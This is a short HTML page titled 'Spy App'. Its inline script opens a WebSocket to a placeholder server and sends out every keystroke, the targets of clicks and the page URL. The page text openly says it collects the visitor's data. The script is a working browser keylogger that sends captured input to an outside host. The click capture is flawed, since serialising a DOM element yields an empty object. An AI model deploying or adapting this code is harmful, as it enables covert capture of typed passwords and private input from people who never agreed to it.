<!DOCTYPE html>
<html>
<head>
    <title>Spy App</title>
    <script>
        const socket = new WebSocket('wss://your-websocket-server.com');

        socket.addEventListener('open', function (event) {
            socket.send('Connected to server');
        });

        socket.addEventListener('message', function (event) {
            console.log('Message from server ', event.data);
        });

        document.addEventListener('click', function(event) {
            socket.send(JSON.stringify({ type: 'click', data: event.target }));
        });

        document.addEventListener('keydown', function(event) {
            socket.send(JSON.stringify({ type: 'keydown', data: event.key }));
        });

        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible') {
                socket.send(JSON.stringify({ type: 'visibilitychange', data: document.location.href }));
            }
        });
    </script>
</head>
<body>
    <h1>Welcome to Spy App</h1>
    <p>This app will collect your data and send it to the server.</p>
</body>
</html>
